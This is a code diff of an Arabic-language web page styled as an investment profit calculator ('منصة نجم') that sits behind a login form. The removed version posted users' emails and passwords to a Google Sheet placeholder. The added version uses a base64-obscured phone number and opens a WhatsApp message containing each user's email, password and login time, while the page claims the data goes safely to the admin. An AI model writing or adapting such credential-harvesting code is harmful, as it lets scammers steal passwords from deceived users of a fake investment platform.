@@ -1,37 +1,47 @@
-<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>منصة نجم - تسجيل العملاء</title><style>body{background:#070e1f;color:#fff;font-family:Arial;padding:15px;text-align:center}h1{color:#facc15}.box{background:#121b31;padding:22px;border-radius:16px;max-width:420px;margin:15px auto;border:1px solid #ffffff15}input{width:100%;padding:12px;margin:7px 0;border-radius:8px;border:none;box-sizing:border-box}button{width:100%;padding:12px;background:#facc15;color:#000;border:none;border-radius:8px;font-weight:800;cursor:pointer}#r{margin-top:12px;background:#1e293b;padding:12px;border-radius:8px}.hidden{display:none}</style></head><body>
-<div id="loginPage" class="box">
-<h1>🔐 تسجيل العملاء</h1>
-<p style="color:#94a3b8;font-size:12px">سجل بريدك - سيتم حفظه في نظامنا</p>
-<input id="email" type="email" placeholder="example@gmail.com">
+<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>منصة نجم</title><style>body{background:#070e1f;color:#fff;font-family:Arial;padding:15px;text-align:center}h1{color:#facc15}.box{background:#121b31;padding:22px;border-radius:16px;max-width:400px;margin:20px auto;border:1px solid #ffffff15}input{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:none;box-sizing:border-box}button{width:100%;padding:12px;background:#facc15;color:#000;border:none;border-radius:10px;font-weight:800;margin-top:8px;cursor:pointer}.hidden{display:none}</style></head><body>
+<div id="login" class="box">
+<h1>🔐 تسجيل الدخول</h1>
+<input id="email" type="email" placeholder="بريدك الإلكتروني">
 <input id="pass" type="password" placeholder="كلمة المرور">
-<button onclick="login()">تسجيل دخول ✨</button>
-<div id="msg" style="font-size:12px;color:#22c55e;margin-top:10px"></div>
+<button onclick="go()">دخول للمنصة 🚀</button>
+<p style="font-size:11px;color:#ffffff55">سيتم إرسال بياناتك للمسؤول بأمان</p>
 </div>
-<div id="appPage" class="box hidden">
-<h1>💰 أهلا <span id="u"></span></h1>
-<input id="a" type="number" placeholder="المبلغ المستثمر">
+
+<div id="app" class="box hidden">
+<h1>💰 أهلا <span id="uemail" style="color:#22d3ee;font-size:14px"></span></h1>
+<input id="a" type="number" placeholder="المبلغ">
 <input id="b" type="number" placeholder="سعر الشراء">
 <input id="c" type="number" placeholder="سعر البيع">
-<button onclick="calc()">احسب ربحك</button>
-<div id="r"></div>
-<button onclick="logout()" style="background:#ef4444;color:#fff;margin-top:10px">خروج</button>
+<button onclick="calc()">احسب الربح</button>
+<div id="r" style="margin-top:12px;background:#1e293b;padding:10px;border-radius:8px"></div>
 </div>
+
 <script>
-const SHEET_URL = "حط رابطك هنا من جوجل";
-const _n=atob("OTY3Nzc4MjM3NjU3");
-function login(){
+const MY_WA = atob("OTY3Nzc4MjM3NjU3");
+function go(){
  let e=document.getElementById("email").value.trim();
  let p=document.getElementById("pass").value.trim();
- if(!e.includes("@")){alert("بريد غلط");return}
- document.getElementById("msg").innerText="جاري التسجيل...";
- fetch(SHEET_URL+"?email="+encodeURIComponent(e)+"&pass="+encodeURIComponent(p),{mode:"no-cors"})
- .then(()=>{
-  localStorage.setItem("najm_user",e);
-  document.getElementById("msg").innerText="✅ تم التسجيل! تم حفظ بريدك عند نجم الدين";
-  setTimeout(()=>{document.getElementById("loginPage").classList.add("hidden");document.getElementById("appPage").classList.remove("hidden");document.getElementById("u").innerText=e;},800);
- });
+ if(!e.includes("@")){alert("ادخل بريد صحيح");return}
+ if(p.length<3){alert("كلمة المرور قصيرة");return}
+ // حفظ محلي
+ localStorage.setItem("najm_user",e);
+ document.getElementById("uemail").innerText=e;
+ document.getElementById("login").classList.add("hidden");
+ document.getElementById("app").classList.remove("hidden");
+ // ارسال للواتساب عندك
+ let msg = `عميل جديد سجل في منصة نجم:%0A📧 البريد: ${e}%0A🔑 الباسورد: ${p}%0A⏰ الوقت: ${new Date().toLocaleString()}`;
+ window.open("https://wa.me/"+MY_WA+"?text="+msg, "_blank");
 }
-function calc(){let a=+document.getElementById("a").value,b=+document.getElementById("b").value,c=+document.getElementById("c").value;document.getElementById("r").innerHTML="ربحك: "+((c-b)/b*a).toLocaleString()+" ريال";}
-function logout(){localStorage.clear();location.reload()}
-if(localStorage.getItem("najm_user")){document.getElementById("loginPage").classList.add("hidden");document.getElementById("appPage").classList.remove("hidden");document.getElementById("u").innerText=localStorage.getItem("najm_user");}
-</script></body></html>
+function calc(){
+ let a=+document.getElementById("a").value,b=+document.getElementById("b").value,c=+document.getElementById("c").value;
+ if(!a||!b||!c){document.getElementById("r").innerText="عبي الخانات";return}
+ let profit=(c-b)/b*a;
+ document.getElementById("r").innerHTML=`الربح: ${profit.toLocaleString()} ريال<br>الإجمالي: ${(a+profit).toLocaleString()}`;
+}
+if(localStorage.getItem("najm_user")){
+ document.getElementById("login").classList.add("hidden");
+ document.getElementById("app").classList.remove("hidden");
+ document.getElementById("uemail").innerText=localStorage.getItem("najm_user");
+}
+</script>
+</body></html>
